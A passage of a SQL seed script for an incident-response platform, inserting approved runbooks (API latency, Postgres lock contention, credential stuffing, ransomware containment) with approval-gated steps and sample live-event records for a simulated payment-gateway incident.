VALUES ('rbk-01', 'Distributed API Outage & Latency Escalation', 'API & Infrastructure', 'v2.4.1', 'Approved', '2026-09-15', 'Platform SRE Team', '["API Gateway","Ingress Controller","Latency Spike"]'::jsonb, 'Standard operational procedure for diagnosing and mitigating severe ingress latency, 5xx storm errors, and DDoS traffic.', '[{"stepNumber":1,"title":"Inspect Ingress Controller Error Rates","instruction":"Execute telemetry query on Envoy ingress proxy metrics to identify upstream cluster returning 502/504 status codes.","safeToAutomate":true,"requiredPermission":"view_evidence","risk":"Low"},{"stepNumber":2,"title":"Compare Traffic Baseline to Anomaly Window","instruction":"Compare ingress RPS against the previous 14-day 99th percentile rolling average.","safeToAutomate":true,"requiredPermission":"view_evidence","risk":"Low"},{"stepNumber":3,"title":"Engage Edge Rate-Limiting Filter","instruction":"Apply dynamic token bucket rate-limiting at Cloudflare / Edge WAF layer for the affected endpoint path.","safeToAutomate":false,"requiredPermission":"approve_actions","risk":"Medium"},{"stepNumber":4,"title":"Scale Up Downstream Replica Sets","instruction":"Verify pod CPU throttling and scale deployment pods from current replica count.","safeToAutomate":false,"requiredPermission":"approve_actions","risk":"Medium"}]'::jsonb)
ON CONFLICT (id) DO NOTHING;

INSERT INTO public.runbooks (id, name, category, version, approval_status, last_reviewed_date, owner, matched_incident_types, description, steps)
VALUES ('rbk-02', 'PostgreSQL Database Latency & Connection Pool Exhaustion', 'Database Tier', 'v3.1.0', 'Approved', '2026-09-20', 'Database Administration (DBA)', '["Database","Postgres","RDS","Connection Pool"]'::jsonb, 'Mitigation procedure when active client connections exceed 90% pool capacity or long-running exclusive locks block queries.', '[{"stepNumber":1,"title":"Sample Active Long-Running Queries","instruction":"Query pg_stat_activity for backend processes in active status exceeding 30 seconds threshold.","safeToAutomate":true,"requiredPermission":"view_evidence","risk":"Low"},{"stepNumber":2,"title":"Verify PgBouncer / RDS Proxy Connection Saturation","instruction":"Inspect client pool wait duration and queue depth.","safeToAutomate":true,"requiredPermission":"view_evidence","risk":"Low"},{"stepNumber":3,"title":"Terminate Hanging Backend Locks","instruction":"Issue pg_cancel_backend() or pg_terminate_backend() for orphaned queries blocking DDL transactions.","safeToAutomate":false,"requiredPermission":"approve_actions","risk":"High"},{"stepNumber":4,"title":"Rotate Read Replicas & Promote Standby Node","instruction":"Initiate graceful cluster failover to healthy synchronous hot standby.","safeToAutomate":false,"requiredPermission":"approve_actions","risk":"Critical"}]'::jsonb)
ON CONFLICT (id) DO NOTHING;

INSERT INTO public.runbooks (id, name, category, version, approval_status, last_reviewed_date, owner, matched_incident_types, description, steps)
VALUES ('rbk-03', 'Suspicious Credential Stuffing & Brute-Force Response', 'Identity & Authentication', 'v1.9.0', 'Approved', '2026-09-28', 'Cyber Threat Intelligence (CTI)', '["Authentication","Okta","Brute Force","Credential Attack"]'::jsonb, 'Approved protocol for containing automated credential replay attacks and distributed botnet authentication attempts.', '[{"stepNumber":1,"title":"Collect IP Geolocation & ASN Distribution","instruction":"Aggregate failed login sources by ASN, Tor exit node registry, and residential proxy lists.","safeToAutomate":true,"requiredPermission":"view_evidence","risk":"Low"},{"stepNumber":2,"title":"Enforce Step-Up FIDO2 / MFA for Targeted Accounts","instruction":"Transition targeted usernames to mandatory hardware token challenge upon next attempt.","safeToAutomate":false,"requiredPermission":"approve_actions","risk":"Medium"},{"stepNumber":3,"title":"Block Malicious ASN / CIDR Ranges at Edge WAF","instruction":"Deploy automated edge IP block rule for offending /24 subnets exhibiting > 100 failed auth/min.","safeToAutomate":false,"requiredPermission":"approve_actions","risk":"High"}]'::jsonb)
ON CONFLICT (id) DO NOTHING;

INSERT INTO public.runbooks (id, name, category, version, approval_status, last_reviewed_date, owner, matched_incident_types, description, steps)
VALUES ('rbk-04', 'Ransomware Canary / Unauthorized File Modification', 'Endpoint & Storage', 'v2.0.2', 'Approved', '2026-08-30', 'Host Forensics Team', '["Ransomware","Host Integrity","File Integrity"]'::jsonb, 'Immediate containment protocol when canary file traps or rapid encryption heuristics trigger on shared storage volumes.', '[{"stepNumber":1,"title":"Collect Cryptographic Process Hashes & Memory Dumps","instruction":"Trigger forensic volatile memory capture on suspect workload node before network detachment.","safeToAutomate":true,"requiredPermission":"view_evidence","risk":"Low"},{"stepNumber":2,"title":"Network Quarantine Suspect Node","instruction":"Apply security group isolation allowing only forensic management port 22 through bastion.","safeToAutomate":false,"requiredPermission":"approve_actions","risk":"Critical"},{"stepNumber":3,"title":"Freeze Volume Snapshots & Revoke IAM Session Keys","instruction":"Create immutable AWS EBS snapshot and invalidate active instance profile credentials.","safeToAutomate":false,"requiredPermission":"approve_actions","risk":"Critical"}]'::jsonb)
ON CONFLICT (id) DO NOTHING;

-- Live Events Seed
INSERT INTO public.live_events (id, timestamp, category, severity, title, description, source, incident_id)
VALUES ('levt-01', '2026-09-30T15:05:00Z', 'incident', 'Critical', 'Incident INC-2026-0891 Status: Investigating', 'Commander Marcus Vance reviewing Envoy socket diagnostic output.', 'CSIRT Console', 'INC-2026-0891')
ON CONFLICT (id) DO NOTHING;

INSERT INTO public.live_events (id, timestamp, category, severity, title, description, source, incident_id)
VALUES ('levt-02', '2026-09-30T15:02:00Z', 'webhook', 'Informational', 'Webhook Received: Datadog APM', 'Ingress metric payload received for payment-gateway cluster (200 OK).', 'Datadog Ingest', NULL)
ON CONFLICT (id) DO NOTHING;

INSERT INTO public.live_events (id, timestamp, category, severity, title, description, source, incident_id)
VALUES ('levt-03', '2026-09-30T14:58:00Z', 'approval', 'High', 'Approval Request Pending: APR-201', 'Rate-limiting filter on IP range 45.154.255.0/24 awaiting sign-off.', 'Approval Center', 'INC-2026-0891')
ON CONFLICT (id) DO NOTHING;

INSERT INTO public.live_events (id, timestamp, category, severity, title, description, source, incident_id)
VALUES ('levt-04', '2026-09-30T14:52:00Z', 'evidence', 'Medium', 'Evidence Added: EVD-101 (Redacted)', 'Envoy access log uploaded with 2 sensitive credentials masked.', 'Evidence Manager', 'INC-2026-0891')
ON CONFLICT (id) DO NOTHING;

INSERT INTO public.live_events (id, timestamp, category, severity, title, description, source, incident_id)
VALUES ('levt-05', '2026-09-30T14:48:00Z', 'alert', 'Critical', 'Alert ALT-9041 Triggered', 'Repeated HTTP 504 Gateway Timeouts on Core Payment API.', 'Cloudflare WAF', 'INC-2026-0891')
ON CONFLICT (id) DO NOTHING;

-- ==============================================================================
-- SETUP COMPLETE! All 13 tables created, RLS enabled, and seed data inserted.
-- ==============================================================================
